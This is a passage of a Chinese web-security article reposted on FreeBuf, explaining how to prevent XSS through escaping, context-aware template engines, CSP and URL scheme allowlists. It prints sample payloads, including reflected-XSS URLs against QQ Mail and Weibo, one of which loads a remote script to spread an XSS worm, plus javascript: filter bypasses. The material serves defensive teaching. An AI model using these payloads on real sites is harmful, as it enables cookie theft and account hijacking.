XSS，但我们可以总结以下原则减少漏洞的产生：</p><p><strong style="color:inherit">利用模板引擎</strong></p><p>开启模板引擎自带的 HTML 转义功能。例如： </p><blockquote><p>在 ejs 中，尽量使用 <code>&lt;%= data %></code> 而不是 <code>&lt;%- data %></code>； </p><p>在 doT.js 中，尽量使用 <code>{{! data }</code> 而不是 <code>{{= data }</code>； </p><p>在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 <code>freemarker.core.OutputFormat</code>。</p></blockquote><p><strong>避免内联事件</strong></p><p>尽量不要使用 <code>onLoad="onload('{{data}}')"</code>、<code>onClick="go('{{action}}')"</code> 这种拼接内联事件的写法。在 JavaScript 中通过 <code>.addEventlistener()</code> 事件绑定会更安全。</p><p><strong style="color:inherit">避免拼接 HTML</strong></p><p>前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 <code>createElement</code>、<code>setAttribute</code> 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。</p><p><strong style="color:inherit">时刻保持警惕</strong></p><p>在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。</p><p><strong style="color:inherit">增加攻击难度，降低攻击后果</strong></p><p>通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。</p><p><strong style="color:inherit">主动检测和发现</strong></p><p>可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。</p><h2> XSS 攻击案例 </h2><h3> QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞 </h3><p>攻击者发现 <code><a href="http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb</a></code> 这个 URL 的参数 <code>uin</code>、<code>domain</code> 未经转义直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，并引导用户去点击：    <br><code><a href="http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert</a>(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p><p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p><pre><code> &lt;script>  <br>getTop().location.href= "/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa" + "&t=" + "&d=bbbb" ; return   false ;  &lt;/ script >  &lt; script >  alert( document .cookie)  &lt;/ script > "+"...<br></code></pre><p>浏览器接收到响应后就会执行 <code>alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p><h3> 新浪微博名人堂反射型 XSS 漏洞 </h3><p>攻击者发现 <code><a href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a></code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p><p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p><p><code><a href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a>">&lt;script src=//xxxx.cn/image/t.js>&lt;/script></code></p><p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p><pre><code> &lt;li>  &lt;a href = "http://weibo.com/pub/star/g/xyyyd" >  &lt; script   src = //xxxx.cn/image/t.js >  &lt;/ script > ">按分类检索 &lt;/ a >  &lt;/ li > <br></code></pre><p>浏览器接收到响应后就会加载执行恶意脚本 <code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p><h2> 扩展阅读：Automatic Context-Aware Escaping </h2><p>上文我们说到：</p><p>1.合适的 HTML 转义可以有效避免 XSS 漏洞。</p><p>2.完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</p><p>3.业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</p><p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p><p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p><p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p><p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p><p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p><pre><code> &lt; html > <br>   &lt; head > <br>     &lt; meta   charset = "UTF-8" > <br>     &lt; title > {{.title}} &lt;/ title > <br>   &lt;/ head > <br>   &lt; body > <br>     &lt; a   href = "{{.url}}" > {{.content}} &lt;/ a > <br>   &lt;/ body > <br> &lt;/ html > <br></code></pre><p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p><pre><code> &lt; html > <br>   &lt; head > <br>     &lt; meta   charset = "UTF-8" > <br>     &lt; title > {{.title | htmlescaper}} &lt;/ title > <br>   &lt;/ head > <br>   &lt; body > <br>     &lt; a   href = "{{.url | urlescaper | attrescaper}}" > {{.content | htmlescaper}} &lt;/ a > <br>   &lt;/ body > <br> &lt;/ html > <br></code></pre><p>目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：</p><p>1.<a href="https://golang.org/pkg/html/template/">go html/template</a></p><p>2.<a href="https://developers.google.com/closure/templates/docs/security">Google Closure Templates</a></p><h2> 课后作业：XSS 攻击小游戏 </h2><p>以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p><p>在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。</p><p><a href="https://alf.nu/alert1">alert(1) to win</a>    <br><a href="http://prompt.ml/">prompt(1) to win</a>    <br><a href="https://xss-game.appspot.com/">XSS game</a></p><h2> 参考文献</h2><p>Wikipedia. <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a><span style="color:#333;font-size:16px">, Wikipedia.</span></p><p>OWASP. <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a><span style="color:#333;font-size:16px">, OWASP.</span></p><p>OWASP. <a href="https://github.com/OWASP/owasp-java-encoder/wiki/2">Use the OWASP Java Encoder</a><span style="color:#333;font-size:16px">-Use-the-OWASP-Java-Encoder), GitHub.</span></p><p>Ahmed Elsobky. <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a><span style="color:#333;font-size:16px">, GitHub.</span></p><p>Jad S. Boutros. <a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems</a><span style="color:#333;font-size:16px">, Google Security Blog.</span></p><p>Vue.js. <a href="https://vuejs.org/v2/api/#v-html">v-html - Vue API docs</a><span style="color:#333;font-size:16px">, Vue.js.</span></p><p>React. <a href="https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml">dangerouslySetInnerHTML - DOM Elements</a><span style="color:#333;font-size:16px">, React.</span></p><h2> 下期预告 </h2><p>前端安全系列文章将对 XSS、CSRF、网络劫持、Hybrid 安全等安全议题展开论述。下期我们要讨论的是 CSRF 攻击，敬请关注。</p><p><b style="color:#9fa3a8">*本文作者：李阳，转载请注明来自FreeBuf.COM</b></p></div></div> <!----> <div class="other-panel" data-v-81187e68><!----> <!----></div> <!----> <!----></div> <div class="tags-panel" data-v-81187e68><p data-v-81187e68><span data-v-81187e68>本文作者：，</span> <span data-v-81187e68>
									转载请注明来自<a href="https://www.freebuf.com" class="net" data-v-81187e68>FreeBuf.COM</a></span></p> <div data-v-81187e68><span class="tag" data-v-81187e68><span class="spot" data-v-81187e68><i class="pot" data-v-81187e68></i></span> <span class="txt" data-v-81187e68># xss</span></span><span class="tag" data-v-81187e68><span class="spot" data-v-81187e68><i class="pot" data-v-81187e68></i></span> <span class="txt" data-v-81187e68># 前端安全</span></span></div></div></div></div> <div class="remix-module" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							被以下专辑收录，发现更多精彩内容
							<!----></div></div> <div class="content column-module" data-v-81187e68><div class="add column-tag" style="background:#f1fff9" data-v-81187e68>
							+ 收入我的专辑
						</div> <div class="add column-tag" style="background:#f1fff9" data-v-81187e68>
							+ 加入我的收藏
						</div>  <div class="add column-tag" style="display:none" data-v-81187e68><span data-v-81187e68>展开更多</span> <span class="arrow" data-v-81187e68><i aria-label="图标: down" class="anticon anticon-down" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></div></div></div> <div class="comment" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							评论<!----> <span class="sort" data-v-81187e68><i aria-label="图标: swap" class="anticon anticon-swap" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="swap" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M847.9 592H152c-4.4 0-8 3.6-8 8v60c0 4.4 3.6 8 8 8h605.2L612.9 851c-4.1 5.2-.4 13 6.3 13h72.5c4.9 0 9.5-2.2 12.6-6.1l168.8-214.1c16.5-21 1.6-51.8-25.2-51.8zM872 356H266.8l144.3-183c4.1-5.2.4-13-6.3-13h-72.5c-4.9 0-9.5 2.2-12.6 6.1L150.9 380.2c-16.5 21-1.6 51.8 25.1 51.8h696c4.4 0 8-3.6 8-8v-60c0-4.4-3.6-8-8-8z"></path></svg></i>按热度排序
							</span></div></div> <div class="intro-list" data-v-81187e68></div> <!----> <div class="bottom-comment-region" data-v-81187e68><div class="input-item" data-v-96500214 data-v-81187e68><div class="avatar" data-v-96500214><div class="img" data-v-96500214><img src="https://image.3001.net/images/index/wp-user-avatar-50x50.png" data-v-96500214></div></div> <div class="content nologin" data-v-96500214><p data-v-96500214>请<span data-v-96500214>登录</span>/<span data-v-96500214>注册</span>后在FreeBuf发布内容哦</p></div></div></div></div> <div class="introduce" data-v-81187e68><div class="module-title" data-v-81187e68><div class="title" data-v-81187e68>
							相关推荐
						</div></div> <div class="intro-list" data-v-81187e68></div></div></div> <div class="aside-right" data-v-81187e68><div class="module-top" data-v-81187e68><div class="author-panel" data-v-81187e68><div class="top-panel" data-v-81187e68><div class="avatar" data-v-81187e68><span data-v-81187e68><img src="" data-v-81187e68>\
								</span></div> <div class="info" data-v-81187e68><div class="name-info" data-v-81187e68><span class="name" data-v-81187e68></span> <!----> <!----> <!----></div> <div class="desc text-line-3" data-v-81187e68>
									
								</div> <p class="follow-view" data-v-81187e68><button type="button" class="focus ant-btn ant-btn-colorBorder" style="margin-top:20px;width:132px" data-v-81187e68><span>关 注</span></button></p></div></div> <ul class="number-panel" data-v-81187e68><li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>文章数</span></li> <li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>评论数</span></li> <li class="item" data-v-81187e68><span class="num" data-v-81187e68>0</span> <span data-v-81187e68>关注者</span></li></ul></div> <!----> <!----></div> <div class="module-middle" data-v-81187e68></div> <!----></div></div> <div class="foot" data-v-81187e68><div class="foot-wraper" data-v-81187e68><div class="foot-container" data-v-81187e68><div class="foot-left" data-v-81187e68><div class="focusInput" data-v-81187e68>
								请 <a href="https://www.freebuf.com/oauth" data-v-81187e68>登录</a> /
								<a href="https://account.tophant.com/register.html" data-v-81187e68>注册</a>后在FreeBuf发布内容哦
							</div></div> <div class="foot-right" data-v-81187e68><span class="approve-num" data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px;margin-right:3px" data-v-322983b7 data-v-81187e68><use xlink:href="#like-fill" data-v-322983b7></use></svg>
						</span> <span class="comment-num" style="margin-left:30px" data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px;margin-right:3px" data-v-322983b7 data-v-81187e68><use xlink:href="#message-fill" data-v-322983b7></use></svg>
						</span></div></div> <div class="foot-container" style="display:none" data-v-81187e68><div class="foot-left" data-v-81187e68><textarea placeholder="请输入您的评论..." maxlength="500" class="ant-input" data-v-81187e68></textarea></div> <div class="foot-right" data-v-81187e68><label class="ant-checkbox-wrapper" data-v-81187e68><span class="ant-checkbox"><input type="checkbox" class="ant-checkbox-input"><span class="ant-checkbox-inner"></span></span><span>
							匿名
						</span></label> <button type="button" class="join ant-btn" data-v-81187e68><span>发 表</span></button> <button type="button" class="cancel ant-btn" data-v-81187e68><span>取 消</span></button> <label class="ant-checkbox-wrapper ant-checkbox-wrapper-checked" style="display:none" data-v-81187e68><span class="ant-checkbox ant-checkbox-checked"><input type="checkbox" checked class="ant-checkbox-input"><span class="ant-checkbox-inner"></span></span><span>
							有人回复时邮件通知我
						</span></label></div></div></div></div> <!----> <!----> <!----> <div data-v-2a4dba56 data-v-81187e68><!----></div> <!----> <!----> <!----> <!----></div></main> <footer class="ant-layout-footer" data-v-55d8de90><div class="footer" data-v-1d178813 data-v-55d8de90><div class="container" data-v-1d178813><div class="footer-left" data-v-1d178813><img src="https://www.freebuf.com/images/logo_b.png" data-v-1d178813> <p data-v-1d178813><span data-v-1d178813>本站由</span>阿里云 提供计算与安全服务</p></div> <div class="footer-center clearfix" data-v-1d178813><div class="footer-list" data-v-1d178813><h3 data-v-1d178813>用户服务</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/write" data-v-1d178813>有奖投稿</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/bounties/detail-72" data-v-1d178813>提交漏洞</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/projects/list" data-v-1d178813>参与众测</a></li> <li data-v-1d178813><a target="_blank" href="https://shop.freebuf.com" data-v-1d178813>商城</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>企业服务</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://company.freebuf.com" data-v-1d178813>安全咨询</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/news/307349.html" data-v-1d178813>产业全景图</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/service/src" data-v-1d178813>企业SRC</a></li> <li data-v-1d178813><a target="_blank" href="https://www.vulbox.com/" data-v-1d178813>安全众测</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>合作信息</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.tophant.com/" data-v-1d178813>斗象官网</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/advertise" data-v-1d178813>广告投放</a></li> <li data-v-1d178813><a target="_blank" href="mailto:help@freebuf.com" data-v-1d178813>联系我们</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/friends" data-v-1d178813>友情链接</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>关于我们</h3> <ul data-v-1d178813><li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/news/others/864.html" data-v-1d178813>关于我们</a></li> <li data-v-1d178813><a target="_blank" href="https://www.freebuf.com/jobs/40386.html" data-v-1d178813>加入我们</a></li> <li data-v-1d178813><div class="weixin-pannel weixin" data-v-1d178813 data-v-1d178813><a href="javascript:;" class="g-icon-qr1" data-v-1d178813>微信公众号</a></div></li> <li data-v-1d178813><a target="_blank" href="http://weibo.com/freebuf" data-v-1d178813>新浪微博</a></li></ul></div> <div class="footer-list" data-v-1d178813><h3 data-v-1d178813>战略伙伴</h3> <ul data-v-1d178813><li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="http://www.aliyun.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571306518_5da83c1686dd9.png" data-v-1d178813></a></li> <li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="http://www.upyun.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571310907_5da84d3bbdf2c.png" data-v-1d178813></a></li> <li style="padding:0 0 10px" data-v-1d178813><a rel="nofollow" target="_blank" href="https://www.trustasia.com/?freebuf" data-v-1d178813><img src="https://image.3001.net/images/20191017/1571306606_5da83c6e8de1c.png" data-v-1d178813></a></li></ul></div></div> <div class="footer-right" data-v-1d178813><h3 data-v-1d178813>FreeBuf+小程序</h3> <img src="https://www.freebuf.com/images/xcx-code.png" alt data-v-1d178813> <p data-v-1d178813>扫码把安全装进口袋</p></div></div> <div class="copyright" data-v-1d178813><div class="container" data-v-1d178813><ul class="clearfix" data-v-1d178813><li data-v-1d178813><a href="https://www.tophant.com/" target="_blank" data-v-1d178813>斗象科技</a></li> <li data-v-1d178813><a href="https://www.freebuf.com" target="_blank" data-v-1d178813>FreeBuf</a></li> <li data-v-1d178813><a href="https://www.vulbox.com/" target="_blank" data-v-1d178813>漏洞盒子</a></li> <li data-v-1d178813><a href="https://www.tophant.ai/" target="_blank" data-v-1d178813>斗象智能安全平台</a></li> <li data-v-1d178813><a href="https://www.freebuf.com/dis" target="_blank" data-v-1d178813>免责条款</a></li> <li data-v-1d178813><a href="https://my.freebuf.com/AgreeProtocol/duty" target="_blank" data-v-1d178813>协议条款</a></li></ul> <p data-v-1d178813>
        Copyright © 2020 WWW.FREEBUF.COM All Rights Reserved
        <a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" data-v-1d178813>
             沪ICP备13033796号
        </a> <span style="padding:0 8px" data-v-1d178813>|</span> <a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502009321" data-v-1d178813>
          沪公安网备
          <img src="https://image.3001.net/images/20200106/1578291342_5e12d08ec2379.png" style="display:inline-block;width:14px;height:12px;position:relative;top:1px;left:3px" data-v-1d178813></a></p></div></div></div></footer></section></div></div></div><script>window.__NUXT__=function(p,t){return{layout:"articles",data:[{articalId:"185654",jobPosition:p,serverData:{post_title:"前端安全系列（一）：如何防止XSS攻击？",post_author:t,nickname:t,post_date:"2018-10-09 11:00:18",post_picture:"http://image.3001.net/images/20180930/15383017461654.png!small",category:[{name:"Web安全",slug:"web",url:"https://www.freebuf.com/articles/web"}],tag:[{tag_id:"1",name:"xss",url:"https://www.freebuf.com/tag/xss"},{tag_id:"9730",name:"前端安全",url:"https://www.freebuf.com/tag/%25E5%2589%258D%25E7%25AB%25AF%25E5%25AE%2589%25E5%2585%25A8"}],post_desc:"在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。",paid_read:p,vip_read:p,paid_read_amount:0,post_content:'<h2>前端安全    <br></h2><p><b style="color: rgb(0, 176, 80);">随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。</b></p><p>近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。</p><p>本文我们会讲解 XSS ，主要包括：</p><blockquote><p>1.XSS 攻击的介绍</p><p>2.XSS 攻击的分类</p><p>3.XSS 攻击的预防和检测</p><p>4.XSS 攻击的总结</p><p>5.XSS 攻击案例</p></blockquote><h2> XSS 攻击的介绍 </h2><p>在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确：</p><p>1.XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。</p><p>2.所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。</p><p>如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。</p><h3> XSS 漏洞的发生和修复 </h3><p>XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。</p><h3> 一个案例 </h3><p>某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下：</p><pre><code> &lt; input &nbsp; type = "text" &nbsp; value = "&lt;%=&nbsp;getParameter("  keyword ")&nbsp;%&gt; "&gt;<br> &lt; button &gt; 搜索 &lt;/ button &gt; <br> &lt; div &gt; <br>&nbsp;&nbsp;您搜索的关键词是： &lt; %= &nbsp; getParameter (" keyword ")&nbsp;%&gt; <br> &lt;/ div &gt; <br></code></pre><p>然而，在上线后不久，小明就接到了安全组发来的一个神秘链接：</p><p><code><a href="http://xxx/search?keyword=">http://xxx/search?keyword=</a>"&gt;&lt;script&gt;alert(\'XSS\');&lt;/script&gt;</code></p><p>小明带着一种不祥的预感点开了这个链接 [请勿模仿，确认安全的链接才能点开] 。果然，页面中弹出了写着"XSS"的对话框。</p><blockquote>    <p>可恶，中招了！小明眉头一皱，发现了其中的奥秘：</p></blockquote><p>当浏览器请求 <code><a href="http://xxx/search?keyword=">http://xxx/search?keyword=</a>"&gt;&lt;script&gt;alert(\'XSS\');&lt;/script&gt;</code> 时，服务端会解析出请求参数 <code>keyword</code>，得到 <code>"&gt;&lt;script&gt;alert(\'XSS\');&lt;/script&gt;</code>，拼接到 HTML 中返回给浏览器。形成了如下的    HTML：</p><pre><code> &lt; input &nbsp; type = "text" &nbsp; value = "" &gt;  &lt; script &gt;  alert( \'XSS\' );  &lt;/ script &gt; "&gt;<br> &lt; button &gt; 搜索 &lt;/ button &gt; <br> &lt; div &gt; <br>&nbsp;&nbsp;您搜索的关键词是："&gt; &lt; script &gt;  alert( \'XSS\' );  &lt;/ script &gt; <br> &lt;/ div &gt; <br></code></pre><p>浏览器无法分辨出 <code>&lt;script&gt;alert(\'XSS\');&lt;/script&gt;</code> 是恶意代码，因而将其执行。</p><p>这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。</p><p>面对这种情况，我们应该如何进行防范呢？</p><p>其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。</p><p>聪明的小明很快找到解决方法，把这个漏洞修复：</p><pre><code> &lt; input &nbsp; type = "text" &nbsp; value = "&lt;%=&nbsp;escapeHTML(getParameter("  keyword "))&nbsp;%&gt; "&gt;<br> &lt; button &gt; 搜索 &lt;/ button &gt; <br> &lt; div &gt; <br>&nbsp;&nbsp;您搜索的关键词是： &lt; %= &nbsp; escapeHTML ( getParameter (" keyword "))&nbsp;%&gt; <br> &lt;/ div &gt; <br></code></pre><p><code>escapeHTML()</code> 按照如下规则进行转义：</p><p>|字符|转义后的字符|    <br>|-|-|    <br>|<code>&amp;</code>|<code>&amp;amp;</code>|    <br>|<code>&lt;</code>|<code>&amp;lt;</code>|    <br>|<code>&gt;</code>|<code>&amp;gt;</code>|    <br>|<code>"</code>|<code>&amp;quot;</code>|    <br>|<code>\'</code>|<code>&amp;#x27;</code>|    <br>|<code>/</code>|<code>&amp;#x2F;</code>|</p><p>经过了转义函数的处理后，最终浏览器接收到的响应为：</p><pre><code> &lt; input &nbsp; type = "text" &nbsp; value = "&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;" &gt; <br> &lt; button &gt; 搜索 &lt;/ button &gt; <br> &lt; div &gt; <br>&nbsp;&nbsp;您搜索的关键词是：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;<br> &lt;/ div &gt; <br></code></pre><p>恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。</p><p>通过这个事件，小明学习到了如下知识：</p><blockquote><p>通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。</p><p>攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。</p><p>攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。</p><p>通过 HTML 转义，可以防止 XSS 攻击。 [事情当然没有这么简单啦！请继续往下看] 。</p></blockquote><h3> 注意特殊的 HTML 属性、JavaScript API </h3><p>自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。</p><p>但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。</p><p>不久，小明又收到安全组的神秘链接：<code><a href="http://xxx/?redirect_to=javascript:alert">http://xxx/?redirect_to=javascript:alert</a>(\'XSS\')</code>。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。</p><p>小明打开对应页面的源码，发现有以下内容：</p><pre><code> &lt; a href = "&lt;%=&nbsp;escapeHTML(getParameter("  redirect_to "))&nbsp;%&gt; "&gt;跳转... &lt;/ a &gt; <br></code></pre><p>这段代码，当攻击 URL 为 <code><a href="http://xxx/?redirect_to=javascript:alert">http://xxx/?redirect_to=javascript:alert</a>(\'XSS\')</code>，服务端响应就成了：</p><pre><code> &lt; a href = "javascript:alert(&amp;#x27;XSS&amp;#x27;)" &gt; 跳转... &lt;/ a &gt; <br></code></pre><p>虽然代码不会立即执行，但一旦用户点击 <code>a</code> 标签时，浏览器会就会弹出“XSS”。</p><blockquote>    <p>可恶，又失策了…</p></blockquote><p>在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。</p><p>原来不仅仅是特殊字符，连 <code>javascript:</code> 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。</p><p>小明眉头一皱，想到了解决办法：</p><pre><code> //&nbsp;禁止&nbsp;URL&nbsp;以&nbsp;"javascript:"&nbsp;开头 <br>xss&nbsp;=&nbsp;getParameter( "redirect_to" ).startsWith( \'javascript:\' );<br> if &nbsp;(!xss)&nbsp;{<br>&nbsp;&nbsp;&lt;a&nbsp;href= "&lt;%=&nbsp;escapeHTML(getParameter(" redirect_to "))%&gt;" &gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;跳转...<br>&nbsp;&nbsp;&lt;/a&gt;<br>}&nbsp; else &nbsp;{<br>&nbsp;&nbsp;&lt;a&nbsp;href= "/404" &gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;跳转...<br>&nbsp;&nbsp;&lt;/a&gt;<br>}<br></code></pre><p>只要 URL 的开头不是 <code>javascript:</code>，就安全了吧？</p><p>安全组随手又扔了一个连接：<code><a href="http://xxx/?redirect_to=jAvascRipt:alert">http://xxx/?redirect_to=jAvascRipt:alert</a>(\'XSS\')</code></p><blockquote>    <p>这也能执行？…..好吧，浏览器就是这么强大。</p></blockquote><p>小明欲哭无泪，在判断 URL 开头是否为 <code>javascript:</code> 时，先把用户输入转成了小写，然后再进行比对。</p><p>不过，所谓“道高一尺，魔高一丈”。面对小明的防护策略，安全组就构造了这样一个连接：</p><p><code><a href="http://xxx/?redirect_to=%20javascript:alert">http://xxx/?redirect_to=%20javascript:alert</a>(\'XSS\')</code></p><p><code>%20javascript:alert(\'XSS\')</code> 经过 URL 解析后变成 <code>javascript:alert(\'XSS\')</code>，这个字符串以空格开头。这样攻击者可以绕过后端的关键词规则，又成功的完成了注入。</p><p>最终，小明选择了白名单的方法，彻底解决了这个漏洞：</p><pre><code> //&nbsp;根据项目情况进行过滤，禁止掉&nbsp;"javascript:"&nbsp;链接、非法&nbsp;scheme&nbsp;等 <br>allowSchemes&nbsp;=&nbsp;[ "http" ,&nbsp; "https" ];<br><br>valid&nbsp;=&nbsp;isValid(getParameter( "redirect_to" ),&nbsp;allowSchemes);<br><br> if &nbsp;(valid)&nbsp;{<br>&nbsp;&nbsp;&lt;a&nbsp;href= "&lt;%=&nbsp;escapeHTML(getParameter(" redirect_to "))%&gt;" &gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;跳转...<br>&nbsp;&nbsp;&lt;/a&gt;<br>}&nbsp; else &nbsp;{<br>&nbsp;&nbsp;&lt;a&nbsp;href= "/404" &gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;跳转...<br>&nbsp;&nbsp;&lt;/a&gt;<br>}<br></code></pre><p>通过这个事件，小明学习到了如下知识：</p><p>1.做了 HTML 